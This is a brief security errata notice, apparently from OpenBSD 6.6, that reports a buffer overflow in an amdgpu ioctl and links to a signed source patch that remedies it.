                                                                                    A buffer overflow was discovered in an amdgpu ioctl.

                                                                                    [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/042_amdgpu.patch.sig)

---


